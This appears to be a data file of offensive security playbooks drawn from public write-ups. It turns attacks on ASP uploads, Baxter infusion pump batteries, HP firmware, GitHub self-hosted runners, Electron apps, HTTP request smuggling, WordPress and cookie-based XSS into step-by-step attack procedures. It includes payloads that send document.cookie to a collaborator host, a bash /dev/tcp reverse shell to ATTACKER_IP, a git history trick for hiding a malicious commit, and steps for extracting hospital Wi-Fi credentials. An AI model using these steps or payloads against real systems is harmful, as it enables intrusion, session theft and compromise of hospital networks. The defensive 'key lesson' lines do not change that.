success_indicators: The ASP file is successfully uploaded and accessible via its URL.
Executing commands within the ASP file results in expected output (e.g., displaying the content of win.ini, or obtaining a shell).
Observing a successful callback to an attacker-controlled server if a reverse shell payload is used.
failure_indicators: Upload fails with an error indicating invalid file type (e.g., 400 Bad Request).
The uploaded file is not executed when accessed via its URL (e.g., returns 404 or raw file content).
Requests to InsertImage.aspx are blocked by a WAF or require authentication (e.g., 401 Unauthorized, 403 Forbidden).

playbooks.impact: Remote Code Execution (RCE) on the target server with the privileges of the IIS application pool. This allows for full control over the server, including data exfiltration, further network pivoting, and deployment of malware.
playbooks.key_lesson: Always validate file uploads rigorously for both file type and content, and ensure that sensitive API endpoints are protected by appropriate authentication and authorization mechanisms, even if they are part of administrative interfaces.

meta.title: Baxter SIGMA Spectrum Infusion Pumps: Multiple Vulnerabilities

trigger_conditions.when_to_apply: When an attacker has physical access to a Baxter SIGMA Spectrum Infusion Pump or its Wi-Fi battery unit.
prerequisites: Attacker must have physical access to the device or battery.
Wi-Fi must be enabled on the infusion pump unit for the overwrite to work.
applicability_signals: Device is a Baxter SIGMA Spectrum Infusion Pump.
Device is connected to a Wi-Fi battery unit.
skip_if: No physical access to the device or battery.

recon_steps: Identify Baxter SIGMA Spectrum Infusion Pumps and associated Wi-Fi battery units in the environment.
Confirm the firmware versions if possible, though physical access is the primary requirement.
attack_steps: Step 1: Gain physical access to an infusion pump or a Wi-Fi battery unit.
Step 2: If accessing a battery unit directly, disassemble it to access the non-volatile memory.
Step 3: If accessing an infusion pump, connect a Wi-Fi battery unit to it.
Step 4: Power-cycle the infusion pump with the connected Wi-Fi battery unit.
Step 5: Quickly remove the Wi-Fi battery unit after the pump has powered up.
Step 6: Reverse-engineer the disassembled battery unit to extract stored Wi-Fi credentials.
Step 7: Alternatively, to overwrite credentials on a de-acquisitioned battery, plug it into an infusion pump unit with invalid or blank Wi-Fi credentials configured, and power up the unit.
payloads_or_patterns: No specific payload required, but the action involves physical manipulation and potentially device disassembly.
tools_recommended: Screwdriver set for device disassembly.
Hardware reverse engineering tools (e.g., logic analyzer, memory reader) to extract data from non-volatile memory.
eBay or other secondary markets to acquire replacement Wi-Fi battery units.
success_indicators: Extracted Wi-Fi SSID and password from the battery unit's non-volatile memory.
Successful connection to the organization's Wi-Fi network using the stolen credentials.
failure_indicators: Unable to gain physical access.
Battery unit does not contain stored Wi-Fi credentials (though writeup indicates all tested units do).
Wi-Fi credentials are not accessible through reverse engineering (unlikely for non-volatile memory storage).
Overwrite procedure fails to erase credentials (writeup suggests it overwrites).

playbooks.impact: An attacker with physical access can steal Wi-Fi credentials, allowing them to gain unauthorized access to the hospital's internal network. This can lead to further compromise of other network devices and sensitive patient data. Stolen credentials from de-acquisitioned devices can also compromise organizations.
playbooks.key_lesson: Assume that IoT devices with physical access might store sensitive credentials in non-volatile memory; ensure secure decommissioning processes include overwriting or physically destroying storage media.

meta.title: Binarly Finds Six High Severity Firmware Vulnerabilities In HP Enterprise Devices

trigger_conditions.when_to_apply: When targeting HP Enterprise devices that have not been patched for SMM memory corruption vulnerabilities.
prerequisites: Attacker must have the ability to execute code within the DXE phase or have a method to trigger SMI handlers.
The specific vulnerability must exist in the target firmware version.
applicability_signals: Affected CVE IDs or BRLY IDs being present in the device's firmware.
Device firmware versions known to be vulnerable.
skip_if: Device firmware has been updated to a patched version.
The target system does not allow code execution in the DXE phase or trigger SMI handlers.

recon_steps: Step 1: Identify the specific HP Enterprise device model and its current firmware version.
Step 2: Compare the firmware version against known vulnerable versions associated with BRLY-2022-010 to BRLY-2021-047.
Step 3: (If possible) Analyze the firmware image for the presence of vulnerable SMI handlers or related code segments.
attack_steps: Step 1: Develop a payload designed to exploit a specific SMM memory corruption vulnerability (e.g., BRLY-2022-010 for stack-based buffer overflow or BRLY-2022-011/012 for out-of-bounds write).
Step 2: Achieve code execution in the DXE phase or find a mechanism to trigger the vulnerable SMI handler.
Step 3: Execute the crafted payload to achieve arbitrary code execution within SMM (Ring -2).
Step 4: Leverage the SMM code execution for persistence, privilege escalation, or further malicious actions.
payloads_or_patterns: Payloads would be specific to the vulnerability type (e.g., crafted CommBuffer data for out-of-bounds writes or stack buffer overflows). Actual payloads are complex and require in-depth firmware analysis, not directly provided in the writeup.
tools_recommended: Firmware analysis tools (e.g., Ghidra, IDA Pro, Binwalk) for understanding firmware structure and identifying vulnerable code.
Tools for developing and injecting payloads into the DXE phase or triggering SMI handlers (highly specialized and not detailed in writeup).
success_indicators: Successful execution of arbitrary code within SMM, confirmed through specific debug outputs, observed system behavior changes, or successful persistence mechanisms.
Successful manipulation of sensitive system parameters or data accessible from SMM.
failure_indicators: Inability to trigger the vulnerable SMI handler or achieve code execution in DXE phase → Investigate alternative execution vectors or firmware analysis for other vulnerabilities.
Payload crashes or causes system instability without desired outcome → Refine payload based on detailed memory analysis and vulnerability specifics.

playbooks.impact: Arbitrary code execution in System Management Mode (SMM), allowing for deep system control, persistent implants, bypassing security mechanisms like Secure Boot, and potential access to highly sensitive system data.
playbooks.key_lesson: Firmware vulnerabilities, especially those in SMM, can lead to deep system compromise and persistence; always verify firmware patch status for critical components like SMM.

meta.title: $900 Blind XSS

trigger_conditions.when_to_apply: When user-provided input is reflected in the application's response, but not directly visible on the page, and the application makes external requests or has integration points.
prerequisites: Ability to submit user-provided input that is processed by the application.
applicability_signals: User input is accepted in a form or API endpoint.
The application integrates with external services or has logging mechanisms that can be monitored.
skip_if: All user input is strictly sanitized and no sensitive data is ever reflected or processed in a way that could trigger an external callback.

recon_steps: Identify all input fields and API parameters that accept user-provided data.
Analyze how the application processes and stores this input, looking for any outbound network requests or integrations.
attack_steps: Step 1: Craft a payload containing a JavaScript snippet that makes an outbound request to a controlled server (e.g., Burp Collaborator, a custom listener).
Step 2: Submit the payload via one of the identified input vectors.
Step 3: Monitor the controlled server for incoming requests that indicate successful execution of the JavaScript payload.
payloads_or_patterns: <script>new Image().src='http://<burp_collaborator_subdomain>/' + document.cookie;</script>
<script>fetch('http://<burp_collaborator_subdomain>/', {method: 'POST', body: document.cookie});</script>
tools_recommended: Burp Suite Collaborator for receiving callbacks.
A custom HTTP listener if not using Burp Suite Collaborator.
success_indicators: A callback request is received at the controlled server from the target application's IP address.
The callback request contains sensitive information like session cookies or user identifiers.
failure_indicators: No callback is received after multiple attempts with different payloads and input vectors. Suggestion: Investigate WAF rules or application-level filtering, or explore other input vectors.
Callback received, but it's from an unexpected source IP or does not contain expected data. Suggestion: The payload might be malformed, or the injected script is not receiving the intended data.

playbooks.impact: Attacker can exfiltrate sensitive data such as session cookies, user IDs, or other sensitive information processed by the application, potentially leading to account takeover or further exploitation.
playbooks.key_lesson: Always test input fields for blind XSS by using payloads that trigger outbound network requests to a controlled listener, as direct reflection is not always necessary for exploitation.

meta.title: Zuckerpunch - Abusing Self Hosted Github Runners at Facebook

affected_components: Self-hosted GitHub Actions runners configured on public repositories
tech_stack_fingerprints: Presence of `runs-on: self-hosted` in GitHub Actions workflow YAML files
Public GitHub repositories with CI/CD configurations

trigger_conditions.when_to_apply: When a public GitHub repository is found to be using self-hosted GitHub Actions runners that are not properly secured, specifically allowing untrusted PRs to trigger workflows.
prerequisites: Attacker has a GitHub account.
Attacker can fork the target GitHub repository.
Target repository has GitHub Actions configured to use self-hosted runners.
Target repository allows pull requests from forks to trigger workflows.
Target repository has not explicitly disabled `workflow_run` or similar events for PRs from forks.
applicability_signals: Discovery of `runs-on: self-hosted` in a target repository's `.github/workflows/` directory.
Successful submission of a pull request from a fork that triggers a GitHub Actions workflow.
Observing the execution of `echo` commands or other test commands within a triggered workflow run.
skip_if: The repository explicitly disables PRs from forks from triggering workflows.
All self-hosted runners are configured to only run jobs from trusted branches, not from PRs.
The CI/CD system has strong input validation and sanitization preventing arbitrary command execution.
WAF blocks common reverse shell payloads or suspicious commands.

recon_steps: Step 1: Perform targeted Google searches for public GitHub repositories using terms like `site:github.com inurl:workflows "self-hosted"` and variations.
Step 2: Analyze search results for repositories that appear to be actively maintained and potentially have CI/CD pipelines configured with self-hosted runners.
Step 3: Fork promising candidate repositories to inspect their `.github/workflows/` directories for YAML files containing `runs-on: self-hosted`.
attack_steps: Step 1: Fork a target repository identified as using self-hosted runners.
Step 2: Create a new branch in the forked repository.
Step 3: Modify a GitHub Actions workflow YAML file (e.g., `main.yml`, `ci.yml`) to include a malicious command. Ensure the job still targets `runs-on: self-hosted`.
Step 4: Commit the change with a benign commit message (e.g., "Refactoring workflow").

Step 5: Perform an interactive rebase (`git rebase -i HEAD^`) to reset the commit's parent to the original branch's HEAD SHA, effectively making the commit appear as if it was never made in the history.
Step 6: Force push the modified branch to the attacker's fork (`git push origin <branch_name> -f`).
Step 7: Create a pull request from the attacker's branch to the target repository's main branch.
Step 8: Monitor the GitHub Actions tab of the target repository for the execution of the workflow triggered by the pull request.
Step 9: If the workflow executes, observe the output for signs of command execution (e.g., `echo` output, reverse shell callback).
payloads_or_patterns: Workflow modification snippet: `- run: echo 'ZUCKERPUNCH_TESTING_CODE_EXECUTION_SUCCESS' > /tmp/zuckerpunch.txt`
Workflow modification snippet for reverse shell: `- run: | bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1` (requires attacker-controlled listener)
Commit message: "Refactoring" or similar innocuous text.

Rebase command: `git rebase -i HEAD^` followed by replacing 'pick' with 'edit' for the malicious commit, then `git reset HEAD~1 --hard` and `git commit --amend --no-edit`, finally `git rebase --continue` or a simpler method of rewriting history before push.
Force push command: `git push origin <branch_name> -f`
tools_recommended: Git: For forking, branching, rebasing, and pushing.
Burp Suite / Collaborator: To host listener for reverse shells or monitor for outbound connections.
GitHub CLI: For potential automation of repository operations.
success_indicators: Observation of custom `echo` output or files created on the self-hosted runner.
Successful reverse shell connection established to the attacker's listener.
Exfiltration of sensitive data (e.g., environment variables, secrets) from the runner's environment.
The target repository owner's reaction, such as banning the attacker's user account, indicating they noticed malicious activity.
failure_indicators: Pull request does not trigger any GitHub Actions workflows.
Workflows that trigger do not execute the malicious payload (e.g., no `echo` output, no reverse shell callback).
The workflow fails with errors related to permissions or unrecognized commands.
GitHub returns a 403 Forbidden error on force push, indicating branch protection rules.
If the rebase/force push technique fails to hide the commit, the target may see the malicious change and take immediate defensive actions.

playbooks.impact: Full root-level code execution on short-lived, ephemeral self-hosted GitHub Actions runner nodes. This can lead to the exfiltration of secrets and credentials available in the runner's environment, lateral movement within the compromised infrastructure (depending on network access and runner configuration), and potential disruption of CI/CD processes.
playbooks.key_lesson: Always restrict workflow execution from untrusted pull requests, especially when using self-hosted runners, and avoid default settings that allow forks to trigger sensitive CI/CD jobs.

meta.title: Quasar: Compromising Electron Apps

trigger_conditions.when_to_apply: When an Electron application is installed in a user-writable directory and its ASAR archive can be modified.
prerequisites: Attacker has write access to the Electron application's installation directory.
applicability_signals: Presence of app.asar file and/or app.asar.unpacked directory in %LOCALAPPDATA%\<AppName>\
skip_if: Electron app uses integrity checking (experimental feature, not widely deployed at time of writeup)
Application files are not installed to user-writable directories.

recon_steps: Identify Electron applications installed on the target system.
Locate installation directories, typically in %LOCALAPPDATA%\<AppName>\.
Observe for the presence of app.asar files and/or app.asar.unpacked directories.
attack_steps: Step 1: Unpack the app.asar file using an ASAR unpacker tool (e.g., 7-Zip plugin, npm asar package).
Step 2: Identify and modify JavaScript files within the unpacked application (e.g., main.bundle.js) to include malicious code, such as spawning a calculator via `child_process.exec`.
Step 3: Re-pack the modified files into a new app.asar archive (if necessary, depending on unpacker capabilities).
Step 4: Replace the original app.asar file with the modified one.
Step 5: Trigger the Electron application to execute the modified code. This could be by simply launching the application.
Step 6 (Optional, for UI compromise): Edit HTML files directly and inject JavaScript (e.g., an `alert()` call), potentially modifying Content-Security-Policy meta tags.
payloads_or_patterns: node.exports.func = () => { require('child_process').exec('calc.exe'); }
<script>alert('XSSed')</script>
tools_recommended: 7-Zip with ASAR plugin
npm package 'asar'
success_indicators: Execution of arbitrary commands (e.g., calculator opens).
Cross-site scripting (XSS) alerts displayed in the application's UI.
failure_indicators: Application fails to launch after ASAR modification → Verify ASAR packing/unpacking process and file integrity. Ensure both .asar and .unpacked directories are present if required.
No code execution or XSS → Ensure modifications are in executable JavaScript files and that the code path is triggered by user interaction or application startup.

playbooks.impact: Arbitrary code execution on the victim's machine with the privileges of the Electron application's user, potentially leading to local privilege escalation, data theft, or persistence.
playbooks.key_lesson: Investigate the unpackability and modifiability of application archives (like ASAR) for Electron apps installed in user-writable locations.

meta.title: How to turn security research into profit: a CL.0 case study

target_profile.technology: Web applications with HTTP/1.1 and HTTP/2 support
tech_stack_fingerprints: Web servers supporting both HTTP/1.1 and HTTP/2

trigger_conditions.when_to_apply: When a web application supports both HTTP/1.1 and HTTP/2, and the CL.0 desync technique is applicable to the server's request processing.
prerequisites: Target must be using a web server or proxy that supports both HTTP/1.1 and HTTP/2.
The target's HTTP request handling must be susceptible to CL.0 desync attacks.
applicability_signals: HTTP/1.1 and HTTP/2 support detected.
HTTP Request Smuggler tool identifies potential CL.0 desync vulnerability.
skip_if: Target only supports HTTP/1.1 or HTTP/2.
Web Application Firewall (WAF) blocks requests with CL.0 desync patterns.

recon_steps: Step 1: Fingerprint target's HTTP protocol support. Use tools like nmap with http2-enum script or observe HTTP/1.1 and HTTP/2 responses to determine if both are supported.

Step 2: Analyze the target's HTTP request processing. Use the HTTP Request Smuggler tool from Burp Suite to identify potential CL.0 desync vulnerabilities by sending specially crafted requests that leverage the 'Content-Length: 0' header.
attack_steps:
Step 1: Send a request with Content-Length: 0 and a malformed Transfer-Encoding header to trigger the CL.0 desync. Example: POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 0
Transfer-Encoding: chunked

GET /smuggled HTTP/1.1
Host: attacker-controlled-host
Step 2: Observe the subsequent requests processed by the server. If the server processes the 'GET /smuggled' request as the start of a new request, the desync is confirmed.
Step 3: Craft a malicious payload in the smuggled request to exploit the desync. This could be a request to an internal endpoint or a request that redirects the user to a malicious site.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 0
Transfer-Encoding: chunked

0

GET /smuggled_endpoint HTTP/1.1
Host: <TARGET_URL>
tools_recommended: Burp Suite Professional: HTTP Request Smuggler extension for identifying and exploiting CL.0 desync vulnerabilities.
nmap: To identify HTTP/1.1 and HTTP/2 support.
success_indicators: The target server processes the smuggled request (e.g., responds to a request for '/smuggled_endpoint' which should not exist in the original request).
Observing unexpected responses or behavior that aligns with the smuggled request.
Successful exfiltration of data or redirection to a malicious host via the smuggled request.
failure_indicators: Target only supports HTTP/1.1 or HTTP/2 and not both.
No desync observed after multiple attempts with different CL.0 patterns.
WAF blocks the crafted requests.
Server returns a 400 Bad Request for the desync attempt, indicating the server correctly handles the malformed headers.

playbooks.impact: An attacker can bypass security controls, access internal resources, hijack user sessions, or redirect users to malicious sites by injecting arbitrary HTTP requests into the request stream.
playbooks.key_lesson: When a target supports both HTTP/1.1 and HTTP/2, investigate CL.0 request smuggling vulnerabilities as they can be overlooked if not specifically tested for.

meta.title: WordPress Core - Unauthenticated Blind SSRF

affected_components: File Upload Functionality (specifically, image processing or sanitization)
tech_stack_fingerprints: WordPress CMS detected (e.g., via response headers, specific URL paths like /wp-admin/ or /wp-content/)

trigger_conditions.when_to_apply: When the target is a WordPress site and a file upload feature exists that processes or sanitizes uploaded files, potentially making external requests during this process.
prerequisites: A WordPress site that allows unauthenticated file uploads.
applicability_signals: Existence of file upload endpoints (e.g., for media, themes, plugins).
Evidence of image or file processing after upload.
Observed outgoing network connections from the server when processing files (requires network monitoring or specific SSRF indicators).
skip_if: File uploads are strictly validated and do not trigger any server-side processing that could involve external network requests.
A Web Application Firewall (WAF) blocks requests containing suspicious URLs or payloads.

recon_steps: Step 1: Identify potential file upload endpoints on the WordPress site (e.g., via common WordPress media upload paths, plugin-specific upload forms).
Step 2: Analyze the file upload process to determine if any server-side processing occurs on the uploaded file that could involve making network requests.
attack_steps: Step 1: Upload a file to a suspected vulnerable endpoint. The file content itself might need to be crafted to trigger specific processing.

Step 2: The writeup suggests using a specially crafted image file that, when processed by WordPress, attempts to fetch an external resource. The specific mechanism for triggering the SSRF is not detailed, but it involves the server making a request to a controlled domain.
Step 3: Monitor a controlled external server (e.g., Burp Collaborator, interactsh) for incoming requests originating from the target server.
payloads_or_patterns: A specially crafted image file that exploits a vulnerability in WordPress's image processing or sanitization routines to perform an SSRF. Specific payload not detailed in writeup.
tools_recommended: Burp Suite (for proxying and analyzing requests/responses)
Burp Collaborator / interactsh (for detecting blind SSRF callbacks)
success_indicators: An incoming request is received on the controlled external server (e.g., Burp Collaborator, interactsh) originating from the target WordPress server's IP address. The request may be an HTTP GET, POST, or DNS lookup, depending on how the SSRF is triggered.
failure_indicators: No incoming request is observed on the controlled external server after attempting the file upload. This could indicate the file upload is not vulnerable, the crafted file is incorrect, or outbound connections are blocked.

playbooks.impact: Allows an unauthenticated attacker to perform server-side requests to arbitrary internal or external resources, potentially leading to information disclosure (e.g., internal network scanning), interaction with internal services, or further exploitation.
playbooks.key_lesson: When dealing with file upload functionality, investigate server-side processing that might involve making external network requests, as this can be a vector for SSRF, especially when unauthenticated.

meta.title: Turning cookie based XSS into account takeover

trigger_conditions.when_to_apply: When a cookie-based XSS vulnerability is found on the main domain and the target offers a public object storage service that allows hosting custom files on a subdomain.
prerequisites: Vulnerable cookie-based XSS on the main domain (e.g. terrahost.no)
Ability to host custom files on a subdomain of terrahost.no
Knowledge of the cookie names and values that are vulnerable to XSS and control the application flow.
applicability_signals: Observed vulnerable cookie like 'customer_name' or 'step' in the main domain's registration flow.
Existence of object storage buckets with *.s3.terrahost.no pattern.
skip_if: No cookie-based XSS found.
No object storage service or custom file hosting is available on subdomains.
The vulnerable cookie is not accessible from a subdomain or controlled by a third-party domain.

recon_steps: Step 1: Identify and confirm cookie-based XSS on the main domain (e.g., terrahost.no) by injecting a simple payload into vulnerable cookies like 'customer_name' and 'step'.
Step 2: Enumerate subdomains of terrahost.no using tools like subfinder, amass, findomain, assetfinder.
Step 3: Identify and confirm the use of object storage buckets by checking for patterns like *.s3.terrahost.no.
Step 4: Interact with the object storage service (using MinIO as indicated) to understand how to host custom files and set bucket policies.
attack_steps: Step 1: Create an HTML file on the identified object storage bucket (e.g., berdzibucket.s3.terrahost.no).

Step 2: This HTML file will contain JavaScript to: a) set a cookie with the malicious payload for 'customer_name' (e.g., ``), b) set the 'step' cookie to enable the second registration step, c) set the domain attribute to '.terrahost.no' to make the cookie valid on the main domain, and d) redirect the victim to the main terrahost.no domain.
Step 3: Set the object storage bucket policy to allow public read access to the crafted HTML file.
Step 4: Trick a victim (e.g., via social engineering) into visiting the crafted HTML file on the object storage subdomain.
payloads_or_patterns: HTML file content for object storage bucket:
tools_recommended: Burp Suite: For intercepting and analyzing requests/responses during XSS confirmation and for identifying vulnerable cookies.
Subdomain enumeration tools (subfinder, amass, findomain, assetfinder): To discover potential subdomains.
MinIO client: To interact with the object storage buckets and upload the crafted HTML file.
A web server for testing the HTML payload locally before uploading to object storage (optional).
success_indicators: The crafted JavaScript successfully sets the 'customer_name' and 'step' cookies with the malicious payload on the '.terrahost.no' domain.

When the victim is redirected to terrahost.no, the payload executes in their browser context, potentially leading to account takeover if the XSS can be leveraged to steal session tokens or perform actions on behalf of the user.
failure_indicators: The object storage bucket is not publicly accessible. -> Investigate bucket policy configuration.
The JavaScript payload fails to set cookies or the domain attribute is incorrect. -> Double-check JavaScript syntax and cookie attributes.
The XSS payload does not execute on terrahost.no after redirection. -> Verify the 'step' cookie is correctly set to enable the second step and that the 'customer_name' cookie is injected as expected.

playbooks.impact: Account takeover of other users on the terrahost.no platform by stealing their session cookies or performing actions on their behalf through the exploited XSS vulnerability.
playbooks.key_lesson: When dealing with cookie-based XSS, investigate if the target provides public object storage or similar services that can host custom content on a subdomain, enabling the transformation of self-XSS into a more widespread attack.
